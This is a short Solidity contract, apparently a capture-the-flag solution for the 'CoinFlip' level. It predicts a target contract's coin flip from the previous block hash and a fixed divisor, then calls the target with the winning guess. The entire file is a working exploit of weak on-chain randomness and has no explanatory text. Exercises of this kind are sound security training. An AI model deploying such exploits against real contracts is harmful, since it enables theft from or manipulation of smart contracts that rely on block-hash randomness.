pragma solidity ^0.4.18;

import './CoinFlip.sol';

contract HackCoinFlip {
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    CoinFlip public targetCoinFlip;

    constructor(address _coinFlip) public {
        require(_coinFlip != 0x0);
        targetCoinFlip = CoinFlip(_coinFlip);
    }

    function hackFlip() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number-1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        return targetCoinFlip.flip(side);
    }
}